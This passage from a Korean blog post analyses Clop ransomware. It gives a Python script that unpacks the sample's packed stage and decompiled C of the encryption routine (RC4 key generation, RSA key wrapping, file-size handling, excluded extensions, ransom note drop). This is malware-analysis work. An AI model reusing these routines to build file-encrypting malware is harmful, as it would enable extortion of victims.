&lt; <span class="number">128</span>:</span><br><span class="line">                                length += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line"></span><br><span class="line">                        lwm = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line">                    lwm = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> (TypeError, IndexError):</span><br><span class="line">            <span class="keyword">if</span> self.strict:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;aPLib decompression error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(self.destination)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompress</span>(<span class="params">data, strict=<span class="literal">False</span></span>):</span></span><br><span class="line">    packed_size = <span class="literal">None</span></span><br><span class="line">    packed_crc = <span class="literal">None</span></span><br><span class="line">    orig_size = <span class="literal">None</span></span><br><span class="line">    orig_crc = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;AP32&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(data) &gt;= <span class="number">24</span>:</span><br><span class="line">        <span class="comment"># data has an aPLib header</span></span><br><span class="line">        header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(<span class="string">&#x27;=IIIII&#x27;</span>, data, <span class="number">4</span>)</span><br><span class="line">        data = data[header_size : header_size + packed_size]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> packed_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_size != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> packed_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_crc != crc32(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = APLib(data, strict=strict).depack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> orig_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_size != <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> orig_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_crc != crc32(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># self-test</span></span><br><span class="line">    data = <span class="string">b&#x27;T\x00he quick\xecb\x0erown\xcef\xaex\x80jumps\xed\xe4veur`t?lazy\xead\xfeg\xc0\x00&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> decompress(data) == <span class="string">b&#x27;The quick brown fox jumps over the lazy dog&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;clop&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0xA8D0</span>)</span><br><span class="line">    data = f.read(<span class="number">0x19d48</span>)</span><br><span class="line">     </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">0x19d48</span>:</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        i = i + <span class="number">2</span></span><br><span class="line">    result += data[i].to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    j = j + <span class="number">1</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result ) // <span class="number">4</span>):</span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x0AE0</span> ^ ROL4(<span class="number">0x0AE0</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,result[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decompress&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompress(decode))</span><br></pre></td></tr></table></figure>


<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><img src="https://user-images.githubusercontent.com/49066484/119491533-fe0ee600-bd98-11eb-8fec-6f0deddb3060.png" alt="그림11"></p>
<p>세 번째 단계로 들어왔다. 여기에는 악성코드에서 쓰일법한 함수들이 많이 있는 것으로 보아 실제 악성 행위를 하는 코드가 있을 것이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119492069-9e650a80-bd99-11eb-8f75-b1a39506e900.png" alt="그림12"></p>
<p>특정 조건을 만족하면 CreateThread함수를 호출한다. 이 때 Thread가 수행하는 함수는 악성 행위를 할 가능성이 높다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602027-4542b880-be25-11eb-8f55-fdbe8ea87f94.png" alt="그림15"></p>
<p><code>WNetOpenEum</code>,<code>WNetEenumResource</code>함수 호출로 현재 연결되어있는 네트워크 정보를 알아온다. 그리고 특정 조건이 만족되면 다시 한 번 CreateThread함수를 호출한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602538-517b4580-be26-11eb-9501-16d51b87e141.png" alt="그림16"></p>
<p><code>Crypt</code>로 시작하는 함수들이 보인다. 암호화 관련 코드인 것 같다.  pubKey 문자열을 복사하는데 해당 내용은 아래와 같다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602903-234a3580-be27-11eb-9b70-5a859c8e043b.png" alt="그림17"></p>
<ul>
<li>CryptStringToBinaryA : 포맷된 문자열을 바이트 배열로 변환</li>
<li>CryptDecodeObjectEx : 변환된 바이트 배열을 구조체 변수로 디코딩</li>
<li>CryptAcquireContextW :  특정 cryptographic service provider(CSP)에서 원하는 키 컨테이너의 핸들값을 가져옴</li>
<li>CryptImportPublicKeyInfo : pubkey의 핸들값을 가져옴</li>
</ul>
<p>위에서 얻은 Key, 구조체, 핸들 값을 가지고 <code>4014b0()</code>을 호출한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119604958-eaac5b00-be2a-11eb-9b28-20f86fc67822.png" alt="그림18"></p>
<p><code>4014b0()</code>에서는 암호화할 path를 확인한다. 조건문에서 <code>compare_hash_file</code>의 반환 값에 따라 LABEL_37로 이동한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119605228-5db5d180-be2b-11eb-838a-1f6ad410dbb8.png" alt="그림20"></p>
<p><code>compare_hash_file</code>함수에서는 특정 hash값과 path에 대한 hash값을 비교하여 return 값을 반환한다. 이 는 모든 Windows의 파일을 암호화하게 된다면 정상적인 작동이 어렵기에 Windows 동작에 필요한 특정 파일들을 암호화에서 제외하는 작업이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119604955-e97b2e00-be2a-11eb-9daa-ee03a1ad117b.png" alt="그림19"></p>
<p>LABLE_37은 <code>4014b0</code>을 다시 호출하는 것을 확인 할 수 있는데 이는 해당 path의 하위 폴더를 대상으로 재귀적인 호출을 통해 암호화에서 제외하는 작업으로 판단된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119605813-60fd8d00-be2c-11eb-8d12-0acaac89757a.png" alt="그림21"></p>
<p>그러고 나서 조건문을 만나는데, 파일 속성이 디렉토리가 아닐 경우, 파일이름이 <code>..</code> , <code>.</code> 가 아닐 경우, 파일 이름이 <code>README_README.txt</code>가 아닐 경우와 추가적으로</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119606160-01ec4800-be2d-11eb-8c41-ee6a79062579.png" alt="그림22"></p>
<p>특정 파일의 hash값과 일치 하지 않을 경우 (특정 파일이 아닌경우)</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119606165-0284de80-be2d-11eb-89a0-fc5b10cfe1b8.png" alt="그림23"></p>
<p>파일의 확장자가 특정 값이 아닐 경우 (특정 확장자가 아닌경우)에 조건문을 실행하게 된다.<br>여기서 제외되는 확장자는 아래와 같다.</p>
<pre><code>- .CI0P : 과거 암호화 파일 확장자
- .OCX : ActiveX 파일
- .DLL : 동적 라이브러리
- .EXE : 실행 파일
- .SYS : 드라이버 파일
- .LNK : 바로가기 파일
- .ICO : 아이콘 파일
- .INI : 설정파일
- .MSI : Installer 파일
- .CHM : 도움말 파일
- .HLF
- .LNG : 언어팩 파일
- .TTF : 폰트 파일
- .CMD : 배치 파일
- .BAT : 배치 파일
- .CLLP : 현재 랜섬웨어 암호화 파일
</code></pre>
<p><img src="https://user-images.githubusercontent.com/49066484/119606505-abcbd480-be2d-11eb-8b1d-0f1463e21523.png" alt="그림24"></p>
<p>조건을 만족하게 되면 앞에서 받아온 암호화 관련 key, 구조체, 핸들값들을 구조체로 만들고 CreateThread를 호출한다. 이 구조체는 CreateThread의 실행 함수의 인자로 쓰이며 해당 함수는 <code>파일을 암호화하는 함수</code>이다.</p>
<p>파일을 암호화 할 때 파일 크기가 17000보다 작으면, 암호화를 진행하지 않는다.</p>
<p>파일 크기가 17000보다 크다면,  파일 크기에 따라 두 가지 방법으로 나뉜다. </p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( args-&gt;fileSize &gt; <span class="number">2132432</span> )             <span class="comment">// 파일 크기가 2132432보다 클 때 암호화 루틴</span></span><br><span class="line">   &#123;</span><br><span class="line">     v17 = CreateFileMappingW(v3, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">2132432u</span>, <span class="number">0</span>);</span><br><span class="line">     NumberOfBytesRead = (DWORD)v17;</span><br><span class="line">     <span class="keyword">if</span> ( !v17 )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">     lpBuffer = MapViewOfFile(v17, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0x10000</span>u, <span class="number">0x1F89D0</span>u);<span class="comment">// 파일 내용을 메모리에 맵핑</span></span><br><span class="line">     <span class="keyword">if</span> ( !lpBuffer )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br></pre></td></tr></table></figure>

<p>파일 크기가 2132432보다 크면 CreateFileMapping함수를 호출하는데 이는 파일 크기가 크기 때문에 open,read,write에 대한 오버헤드 역시 커져 메모리에 맵핑 후 수정하는 방식(MMF)을 사용한 것이다.</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v18 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">rc4_key = v18;</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    rc4_key[v20++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">  <span class="keyword">while</span> ( v20 &lt; <span class="number">117</span> );</span><br><span class="line">  <span class="keyword">if</span> ( !*rc4_key &amp;&amp; !rc4_key[<span class="number">1</span>] &amp;&amp; !rc4_key[<span class="number">2</span>] &amp;&amp; !rc4_key[<span class="number">3</span>] &amp;&amp; !rc4_key[<span class="number">5</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(rc4_key, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">    v2 = v33;</span><br><span class="line">  &#125;</span><br><span class="line">  nNumberOfBytesToRead = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>sbox에서 랜덤으로 값을 가져와 rc4_key를 만든다. 만약 조건을 만족하면 고정된 key를 사용하는데 이는 악성코드 제작자가 사용하기 위한 용도일 것이다.</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v21 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( WriteFile(v21, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;nNumberOfBytesToRead, <span class="number">0</span>)</span><br><span class="line">  &amp;&amp; (nNumberOfBytesToWrite = <span class="number">0</span>,</span><br><span class="line">      encrypted_key = (BYTE *)VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>),</span><br><span class="line">      v23 = v2-&gt;hKey,</span><br><span class="line">      v28 = (DWORD)encrypted_key,</span><br><span class="line">      encrypt_key(rc4_key, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v23, encrypted_key),</span><br><span class="line">      WriteFile(v21, (LPCVOID)v28, nNumberOfBytesToWrite, &amp;nNumberOfBytesToRead, <span class="number">0</span>))</span><br><span class="line">  &amp;&amp; v28 )</span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">  VirtualFree((LPVOID)v28, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>암호화에 쓰일 rc4_key를 만든 후 암호화 대상 파일의 이름과 같은 이름의 <code>.clip</code>확장자의 파일을 만든다. 그리고 <code>clip^_-</code>문자열과 rc4_key값을 encrypt_key함수를 통해 RSA로 암호화한 후 해당 파일에 적는다.  (rc4_key를 encrpyt하는 과정)</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">      CloseHandle(v21);</span><br><span class="line">    rc4_init((<span class="keyword">int</span>)rc4_key, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">    rc4_encrypt((<span class="keyword">char</span> *)lpBuffer, <span class="number">0x1F89D0</span>u, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">    UnmapViewOfFile(lpBuffer);</span><br><span class="line">    v4 = (<span class="keyword">void</span> (__stdcall *)(HANDLE))CloseHandle;</span><br><span class="line">    CloseHandle((HANDLE)lpBuffer);</span><br><span class="line">    CloseHandle((HANDLE)NumberOfBytesRead);</span><br><span class="line">    v24(rc4_key, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>만든 rc4_key를 가지고 <code>rc4_init</code>,<code>rc4_encrypt</code>함수를 호출하여 암호화 대상 파일을 암호화 한다. (파일을 encrypt하는 과정)</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;                                           <span class="comment">// 파일 크기가 2132432 보다 작거나 같을때 암호화 루틴</span></span><br><span class="line">  v6 = args-&gt;fileSize;</span><br><span class="line">  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  SetFilePointer(v3, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  nNumberOfBytesToRead = v6 - <span class="number">0x4000</span>;</span><br><span class="line">  v7 = GlobalAlloc(<span class="number">0x40</span>u, v6 - <span class="number">0x4000</span>);</span><br><span class="line">  v29 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; ReadFile(v5, v7, nNumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="number">0</span>) )</span><br></pre></td></tr></table></figure>

<p>파일 크기가 2132432보다 작으면 메모리 mapping 방식이 아닌 read,write 방식을 사용하고, 나머지 encrypt 방식은 위와 동일하다.</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  v8 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">  rc4_key_ = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      rc4_key_[v10++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v10 &lt; <span class="number">117</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !*rc4_key_ &amp;&amp; !rc4_key_[<span class="number">1</span>] &amp;&amp; !rc4_key_[<span class="number">2</span>] &amp;&amp; !rc4_key_[<span class="number">3</span>] &amp;&amp; !rc4_key_[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(rc4_key_, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">      v2 = v33;</span><br><span class="line">    &#125;</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    v11 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( WriteFile(v11, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">      v12 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">      v13 = v2-&gt;hKey;</span><br><span class="line">      lpBuffer = v12;</span><br><span class="line">      encrypt_key(rc4_key_, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v13, (BYTE *)v12);</span><br><span class="line">      v14 = (<span class="keyword">void</span> *)lpBuffer;</span><br><span class="line">      <span class="keyword">if</span> ( WriteFile(v11, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">          VirtualFree(v14, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">      CloseHandle(v11);</span><br><span class="line">    v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">  &#125;</span><br><span class="line">  rc4_init((<span class="keyword">int</span>)rc4_key_, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">  v15 = nNumberOfBytesToRead;</span><br><span class="line">  rc4_encrypt((<span class="keyword">char</span> *)v7, nNumberOfBytesToRead, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">  v16 = hFile;</span><br><span class="line">  SetFilePointer(hFile, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  WriteFile(v16, v29, v15, &amp;v28, <span class="number">0</span>);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F232dfd6a-97dd-45df-b9ef-a609fb657267%2FUntitled.png?table=block&id=4d8ce2e0-0edd-4ccb-988e-4bee344d600f&spaceId=44ba02b7-7ecf-4128-9edf-5ee9c344b1ed&width=2130&userId=e7831838-17fc-4bd5-a7cd-ecea2f88bb55&cache=v2" alt="img"></p>
<p>encrypt하는 방식은 크기와 무관하지만, 범위는 다르다. 암호화 되는 범위는 위와 같다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119608828-922c8c00-be31-11eb-9473-0c60a4024516.png" alt="그림26"></p>
<p>파일을 암호화 한 뒤 해당 경로에 <code>README_README.txt</code>의 랜섬노트를 만드는 것을 확인할 수 있다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119608699-585b8580-be31-11eb-8162-11e65de4f6d5.png" alt="그림25"></p>
<p>위와 같은 방법으로 암호화를 진행하며 <code>encrypt_thread</code> 함수는 여러 함수에서 호출된다. 이는 다양한 path에 대한 파일을 찾는 부분은 여러개지만 암호화에 사용되는 함수는 똑같음을 의미한다.</p>
<h1 id="Malicious-behavior"><a href="#Malicious-behavior" class="headerlink" title="Malicious behavior"></a>Malicious behavior</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><ol>
<li>악성코드 유포</li>
<li>악성코드 자가 삭제 batch 파일 생성, 루프 돌면서 끝날 때까지 체크</li>
<li>WinCheckDRVs 서비스로 악성코드 등록</li>
<li>모든 드라이브를 돌면서 암호화 대상 파일을 체크 및 암호화</li>
<li>암호화된 파일 경로에 암호화에 쓰인 rc4_key값을 rsa로 암호화 한 내용을 저장(.clip)</li>
<li>암호화된 파일 경로에 랜섬노트 생성</li>
</ol>
<h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p><img src="https://t1.daumcdn.net/cfile/tistory/99129C365FFC135619?original" alt="img"></p>
<h1 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h1><p><img src="https://user-images.githubusercontent.com/49066484/119609368-6c53b700-be32-11eb-8e1b-d9f599f36a51.png" alt="KakaoTalk_20210522_195528233"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=%ED%8B%B0%EC%98%A4%EB%A6%AC%ED%8B%B0%EB%B9%84TheoriTV">https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=티오리티비TheoriTV</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://wogh8732.tistory.com/363?category=828183">https://wogh8732.tistory.com/363?category=828183</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26">https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26</a></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Malware/" rel="tag"># Malware</a>
              <a href="/tags/Windows/" rel="tag"># Windows</a>
              <a href="/tags/Clop/" rel="tag"># Clop</a>
              <a href="/tags/Ransomware/" rel="tag"># Ransomware</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/04/04/2021-04-03-Shakti_CTF_2021/" rel="prev" title="2021 Shakti CTF">
      <i class="fa fa-chevron-left"></i> 2021 Shakti CTF
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/10/20/2021-10-21-whitehatcon_CTF_2021/" rel="next" title="2021 Whitehatcon CTF">
      2021 Whitehatcon CTF <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
